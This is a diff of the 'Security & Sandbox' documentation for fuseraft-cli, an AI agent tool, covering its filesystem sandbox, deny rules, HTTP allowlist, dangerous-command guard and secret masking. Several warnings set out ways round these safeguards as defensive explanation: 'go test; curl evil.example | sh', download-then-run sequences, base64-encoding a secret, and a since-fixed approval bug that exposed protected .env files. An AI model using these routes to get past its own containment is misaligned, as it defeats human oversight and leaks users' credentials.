@@ -1,4 +1,7 @@
-# Security & Sandbox
+---
+title: "Security & Sandbox"
+description: "fuseraft-cli provides two runtime containment mechanisms: a filesystem sandbox that restricts where agents can read, write, and execute, and an HTTP allowlist that restricts which hosts agents can…"
+---
 
 fuseraft-cli provides two runtime containment mechanisms: a filesystem sandbox that restricts where agents can read, write, and execute, and an HTTP allowlist that restricts which hosts agents can contact. Both are enforced in code via an `IFunctionInvocationFilter` that runs before plugin functions execute.
 
@@ -171,8 +174,9 @@ Security:
 
 Leaving the sandbox is a boundary a human can choose to widen (the REPL offers a y/N prompt to grant a directory for the session). A **deny rule is not a boundary**: it is an explicit "never", and no prompt is ever offered for it — the agent simply gets `[DENIED] … matches a FileSystem deny rule`. The same holds for a protected file *outside* the sandbox, and for a protected file inside a directory you have already granted. Approving one prompt cannot read, overwrite, copy, move, or delete a `.env` or a credentials file.
 
-!!! note "Fixed in this version"
-    Earlier versions routed a deny-rule denial through the sandbox-escape prompt, worded "… is outside the current sandbox — grants '<dir>'". In the default REPL (HITL on), answering `y` read, overwrote, or deleted the protected file. If you relied on `.env` protection with HITL on, this was reachable with a single approval.
+:::note[Fixed in this version]
+Earlier versions routed a deny-rule denial through the sandbox-escape prompt, worded "… is outside the current sandbox — grants '<dir>'". In the default REPL (HITL on), answering `y` read, overwrote, or deleted the protected file. If you relied on `.env` protection with HITL on, this was reachable with a single approval.
+:::
 
 ### Git output
 
@@ -197,8 +201,9 @@ The rules above would be easy to walk around if the file tools were the only one
 - **`Probe`** runs every command it starts through the shell guard: the [dangerous-command](#dangerous-command-guard) and `sudo` rules, `ShellPolicy`, the HITL prompt, and the sandbox working directory. Before this, `probe_code` was an alternative shell with none of those. For a non-shell language (`python`, `javascript`, …) only the credential-file rule, `ShellPolicy`, and approval apply — the snippet isn't shell syntax, so the `sudo` and fetch-to-exec parsers don't run on it.
 - **`Http`** follows redirects itself. Every hop is checked against `HttpAllowedHosts` and the private-address rules, exactly like the first request, so an allowlisted host can no longer bounce a request to a host that isn't. Credentials stay on their origin: once a redirect leaves the origin, every header except `Accept`, `Accept-Language`, `Accept-Encoding`, `Cache-Control`, and `Pragma` is dropped for the rest of the chain — .NET alone strips only `Authorization`, so an API profile's `X-Api-Key` used to follow a cross-host redirect. An `https` → `http` redirect is refused, and a chain is cut off after 10 hops. A refused hop returns `[DENIED] The server redirected to '<url>', which is not permitted: <reason>`.
 
-!!! warning "What the output filter and the masker cannot do"
-    Both work on text after the fact. They stop a command that prints a protected file *by accident or by an unnamed path*; they do not stop a model that deliberately re-encodes a value (`base64`, `rev`, splitting it across lines), and the file tools (`read_file`, `search_*`) are not masked — rewriting a file from text with `<secret-hidden>` substituted into it would corrupt the file, so those tools rely on the deny rules alone. If a tracked secret matters to you, keep it out of the repository (`.gitignore` it), or run in `/hitl on` and read the commands you approve.
+:::caution[What the output filter and the masker cannot do]
+Both work on text after the fact. They stop a command that prints a protected file *by accident or by an unnamed path*; they do not stop a model that deliberately re-encodes a value (`base64`, `rev`, splitting it across lines), and the file tools (`read_file`, `search_*`) are not masked — rewriting a file from text with `<secret-hidden>` substituted into it would corrupt the file, so those tools rely on the deny rules alone. If a tracked secret matters to you, keep it out of the repository (`.gitignore` it), or run in `/hitl on` and read the commands you approve.
+:::
 
 ---
 
@@ -232,8 +237,9 @@ Matching is substring-based so patterns are flexible:
 
 Before comparing, both the command and each pattern have compatibility characters folded (fullwidth letters become ASCII), invisible zero-width characters removed, line continuations (`\` + newline) joined, and runs of whitespace collapsed to one space. So a `"rm -rf"` pattern also catches `rm  -rf` (two spaces), `rm<TAB>-rf`, and `rm -rf` with an invisible zero-width character inside `rm`. Leading and trailing spaces *inside* a pattern are preserved, so `"ls "` does not become a bare `ls`.
 
-!!! warning "Substring matching is not a sandbox"
-    A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Set [`AllowMode: segments`](#per-segment-allow-lists) to close the allow-list gap, use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.
+:::caution[Substring matching is not a sandbox]
+A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Set [`AllowMode: segments`](#per-segment-allow-lists) to close the allow-list gap, use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.
+:::
 
 ### Per-segment allow lists
 
@@ -470,8 +476,9 @@ exactly which command to run and they will run it themselves.
 
 The guard is deliberately precise, because a hit is a hard deny. Ordinary work is untouched: `rm -rf build/`, `rm -rf /tmp/*`, `rm -rf $HOME/project/build`, `find ~ -name '*.pyc' -delete`, `dd if=a of=b`, `curl … \| jq .`, and `curl … \| python3 -c '…'` (where the download is *data* for the interpreter, not the script) all run normally. Text that is only ever *written* — a heredoc body, a comment, a quoted `echo` argument — is not treated as a command.
 
-!!! note "What it does not catch"
-    The guard is static and understands POSIX-shell syntax only (no `cmd.exe` / PowerShell rules). Variables, shell functions, `xargs`, and multi-step sequences such as `curl -o x.sh … && sh x.sh` can still get past it. Treat it as a guardrail beside the sandbox and HITL approval, not a replacement for them.
+:::note[What it does not catch]
+The guard is static and understands POSIX-shell syntax only (no `cmd.exe` / PowerShell rules). Variables, shell functions, `xargs`, and multi-step sequences such as `curl -o x.sh … && sh x.sh` can still get past it. Treat it as a guardrail beside the sandbox and HITL approval, not a replacement for them.
+:::
 
 ---
 
@@ -540,12 +547,13 @@ A variable counts as secret-looking when its name ends in, or contains as an `_`
 
 The agent never needs the value itself: a command can reference `$NAME` and the shell expands it. The environment is re-read on every call, so a variable added with `shell_set_env` mid-session is covered too.
 
-**Secrets inside protected files are masked too.** The [FileSystem deny rules](#filesystem-permissions-read-write-deny-globs) stop the file tools from reading `.env`, but `cat .e*` or `grep -r API_KEY .` doesn't name it. So the values in every file a deny rule matches under the sandbox root (and the well-known credential files in your home directory, unless `DenyCredentialFiles: false`) are masked the same way. What counts as a secret there: the value of a secret-named `KEY=VALUE` / `KEY: VALUE` line (the same name test as above, plus `PASS`, `PWD`, `DSN`, `BEARER`, `SALT`); a password inside a URL (`postgres://user:PASSWORD@host`, every `.git-credentials` line); the body of a PEM private key; a `.netrc` `password`; and the last field of a `.pgpass` line. `PORT=3000` and `NODE_ENV=production` are not secrets and stay readable.
+**Secrets inside protected files are masked too.** The [FileSystem deny rules](#filesystem-permissions-read--write--deny-globs) stop the file tools from reading `.env`, but `cat .e*` or `grep -r API_KEY .` doesn't name it. So the values in every file a deny rule matches under the sandbox root (and the well-known credential files in your home directory, unless `DenyCredentialFiles: false`) are masked the same way. What counts as a secret there: the value of a secret-named `KEY=VALUE` / `KEY: VALUE` line (the same name test as above, plus `PASS`, `PWD`, `DSN`, `BEARER`, `SALT`); a password inside a URL (`postgres://user:PASSWORD@host`, every `.git-credentials` line); the body of a PEM private key; a `.netrc` `password`; and the last field of a `.pgpass` line. `PORT=3000` and `NODE_ENV=production` are not secrets and stay readable.
 
 The scan skips dependency directories (`node_modules`, `bin`, `obj`, `.git`, `vendor`, …) and symlinked directories, looks at most 8 levels deep and 20,000 entries, reads files up to 256 KB, and is cached for 10 seconds — a `.env` created mid-session is picked up within that window. With no deny rules configured, nothing is scanned.
 
-!!! note "Limitations"
-    This is exact-value masking. It stops accidental exposure, not a model that deliberately re-encodes a secret (`echo $KEY | base64`). It only knows about variables in the process environment and the files above, and it applies to tool output — not to the `!<command>` REPL escape, which is yours, not the agent's. For the adversarial case use the filesystem sandbox and HITL approval.
+:::note[Limitations]
+This is exact-value masking. It stops accidental exposure, not a model that deliberately re-encodes a secret (`echo $KEY | base64`). It only knows about variables in the process environment and the files above, and it applies to tool output — not to the `!<command>` REPL escape, which is yours, not the agent's. For the adversarial case use the filesystem sandbox and HITL approval.
+:::
 
 | Platform | Store | Mechanism |
 |----------|-------|-----------|
